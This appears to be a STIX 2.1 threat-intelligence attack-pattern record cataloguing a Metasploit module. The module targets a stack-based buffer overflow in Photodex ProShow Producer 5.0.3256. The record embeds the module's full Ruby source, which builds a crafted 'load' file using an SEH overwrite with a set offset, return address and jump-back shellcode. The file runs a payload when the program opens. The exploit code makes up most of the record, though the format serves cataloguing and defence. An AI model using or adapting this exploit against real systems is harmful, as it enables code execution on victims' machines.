{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--910a31bd-be0a-43e3-843c-6d310fd1179a",
    "created": "2024-08-14T16:35:27.884848Z",
    "modified": "2024-08-14T16:35:27.884852Z",
    "name": "Photodex ProShow Producer 5.0.3256 load File Handling Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Photodex ProShow Producer v5.0.3256 in the handling of the plugins load list file. An attacker must send the crafted \"load\" file to victim, who must store it in the installation directory. The vulnerability will be triggered the next time ProShow is opened. The module has been tested successfully on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/proshow_load_bof.rb",
            "external_id": "proshow_load_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://security.inshell.net/advisory/30"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Photodex ProShow Producer 5.0.3256 load File Handling Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Photodex ProShow Producer\n        v5.0.3256 in the handling of the plugins load list file. An attacker must send the\n        crafted \"load\" file to victim, who must store it in the installation directory. The\n        vulnerability will be triggered the next time ProShow is opened. The module has been\n        tested successfully on Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [\n        'Julien Ahrens', # Vulnerability discovery and PoC\n        'mr.pr0n', # Additional PoC\n        'juan vazquez', # Metasploit module\n      ],\n      'References'     =>\n        [\n          [ 'OSVDB', '83745' ],\n          [ 'EDB', '19563' ],\n          [ 'EDB', '20036' ],\n          [ 'URL', 'http://security.inshell.net/advisory/30' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 9844,\n          'BadChars' => \"\\x00\\x0a\\x0d\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [\n            'Photodex ProShow Producer 5.0.3256 / Windows XP SP3 / Windows 7 SP1',\n            {\n              'Offset' => 9844,\n              'Ret' => 0x1022A959 # p/p/r from if.dnt\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-06-06',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'load']),\n      ])\n  end\n\n  # Overriding file_create to allow the creation of a file without extension\n  def file_create(data)\n\n    fname = datastore['FILENAME']\n    ltype = \"exploit.fileformat.#{self.shortname}\"\n\n    if ! ::File.directory?(Msf::Config.local_directory)\n      FileUtils.mkdir_p(Msf::Config.local_directory)\n    end\n\n    path = File.join(Msf::Config.local_directory, fname)\n    full_path = ::File.expand_path(path)\n    File.open(full_path, \"wb\") { |fd| fd.write(data) }\n\n    report_note(:data => full_path.dup, :type => \"#{ltype}.localpath\")\n\n    print_good \"#{fname} stored at #{full_path}\"\n\n  end\n\n  def exploit\n\n    sploit = payload.encoded\n    sploit << generate_seh_record(target.ret)\n    # jmp back to the payload\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-#{target['Offset']+8}\").encode_string\n    # cause exception hitting the end of the stack\n    sploit << rand_text(300)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n    file_create(sploit)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-06-06",
    "x_mitre_platforms": [
        "win'"
    ]
}